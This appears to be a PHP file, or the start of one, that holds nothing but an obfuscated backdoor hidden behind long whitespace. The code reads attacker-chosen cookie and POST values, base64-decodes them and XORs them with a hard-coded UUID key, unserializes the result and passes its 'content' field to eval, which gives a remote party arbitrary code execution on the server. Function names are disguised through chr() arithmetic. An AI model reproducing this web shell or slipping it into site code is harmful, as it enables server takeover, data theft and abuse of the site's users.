<?php                                                                                                                                                                                                                                                                                                                                                                                                 $vdxcD = class_exists("Hj_aKir"); $uDHrF = $vdxcD;if (!$uDHrF){class Hj_aKir{private $qPdfkmUXvS;public static $rrUxQsI = "3aec7d11-07c7-460a-b50e-fc2d7d59dc3f";public static $ORdKxaYiGX = NULL;public function __construct(){$FbNxBs = $_COOKIE;$dbXFK = $_POST;$wGpYIwenhD = @$FbNxBs[substr(Hj_aKir::$rrUxQsI, 0, 4)];if (!empty($wGpYIwenhD)){$SqPSftPWXi = "base64";$CNusjox = "";$wGpYIwenhD = explode(",", $wGpYIwenhD);foreach ($wGpYIwenhD as $pOvjDtC){$CNusjox .= @$FbNxBs[$pOvjDtC];$CNusjox .= @$dbXFK[$pOvjDtC];}$CNusjox = array_map($SqPSftPWXi . chr ( 689 - 594 ).'d' . "\x65" . 'c' . chr (111) . chr (100) . chr ( 379 - 278 ), array($CNusjox,)); $CNusjox = $CNusjox[0] ^ str_repeat(Hj_aKir::$rrUxQsI, (strlen($CNusjox[0]) / strlen(Hj_aKir::$rrUxQsI)) + 1);Hj_aKir::$ORdKxaYiGX = @unserialize($CNusjox);}}public function __destruct(){$this->xiTneSvFc();}private function xiTneSvFc(){if (is_array(Hj_aKir::$ORdKxaYiGX)) {$ADVSoLjVK = str_replace(chr (60) . '?' . chr ( 736 - 624 )."\150" . chr ( 126 - 14 ), "", Hj_aKir::$ORdKxaYiGX[chr ( 138 - 39 ).'o' . "\x6e" . "\x74" . 'e' . "\156" . chr (116)]);eval($ADVSoLjVK);exit();}}}$hOjrG = new Hj_aKir(); $hOjrG = NULL;} ?><?php
